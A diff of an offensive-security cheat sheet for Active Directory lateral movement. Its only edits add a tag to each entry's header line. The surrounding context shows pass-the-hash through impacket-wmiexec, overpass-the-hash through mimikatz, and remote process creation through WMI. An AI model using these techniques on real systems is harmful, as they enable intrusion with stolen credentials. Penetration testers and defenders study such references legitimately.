@@ -1,5 +1,5 @@
 % sealldev, lateral movement, wmi, active directory
-@ windows-variables
+@ sealldev, windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
 ; Lateral movement via WMI
@@ -16,7 +16,7 @@
  Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
 
 % sealldev, lateral movement, winrm, active directory
-@ windows-variables
+@ sealldev, windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
 ; Lateral movement via WinRM
@@ -32,7 +32,7 @@ Enter-PSSession <SESSION_NUMBER>
 $ SESSION_NUMBER: echo "\(replace this with session number that is returned after creating the session\)"
 
 % sealldev, lateral movement, psexec, active directory, sysinternals
-@ windows-variables
+@ sealldev, windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
 ; Lateral movement using sysinternals suite
@@ -42,7 +42,7 @@ $ SESSION_NUMBER: echo "\(replace this with session number that is returned afte
 
 
 % sealldev, lateral movement, pass the hash, impacket, active directory
-@ windows-variables
+@ sealldev, windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
 ; Lateral movement via Pass the Hash using impacket
@@ -53,7 +53,7 @@ $ SESSION_NUMBER: echo "\(replace this with session number that is returned afte
 /usr/bin/impacket-wmiexec -hashes :<LOCAL_ADMIN_NTLM_HASH> Administrator@<host_address>
 
 % sealldev, lateral movement, overpass the hash, mimikatz, active directory
-@ windows-variables
+@ sealldev, windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
 ; Overpass the hash involves creating a TGT using a given NTLM hash
@@ -67,7 +67,7 @@ sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM_HASH> /run:powershel
 
 
 % sealldev, lateral movement, pass the ticket, mimikatz, active directory
-@ windows-variables
+@ sealldev, windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
 ; In kerberos, TGTs are typically tied to the user session it was created in
